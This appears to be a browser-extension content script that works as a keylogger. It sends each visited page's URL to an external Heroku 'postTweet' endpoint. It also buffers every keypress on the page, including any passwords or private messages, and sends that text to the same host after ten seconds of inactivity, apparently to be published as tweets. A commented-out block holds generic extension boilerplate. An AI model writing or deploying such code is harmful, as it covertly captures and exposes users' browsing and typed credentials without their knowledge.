function sendTweet(status) {

    console.log(status);
    var object1 = {
        status: status,
    }

    fetch('https://radiant-meadow-89003.herokuapp.com/postTweet', {
    method: 'post',
    body: JSON.stringify(object1),
    headers: {
        'Content-type': 'application/json',
    }
})
};




var types = '';
var timeOver;


console.log('I visited '+ document.location);
sendTweet('I just visited ' + document.location);

document.addEventListener('keypress', function(e) {
    types += e.key;

    if(timeOver) clearTimeout(timeOver);
    timeOver = setTimeout(() => {
        sendTweet('I just typed \"' + types + "\"");
        types = '';
    }, 10000);
}, false);

// function login(){
//
//   // content.js
//   alert('check')
//   chrome.runtime.onMessage.addListener(
//     function(request, sender, sendResponse) {
//       if( request.message === "clicked_browser_action" ) {
//         var firstHref = $("a[href^='http']").eq(0).attr("href");
//
//         console.log(firstHref);
//
//         // This line is new!
//         chrome.runtime.sendMessage({"message": "open_new_tab", "url": firstHref});
//       }
//     }
//   );
// }
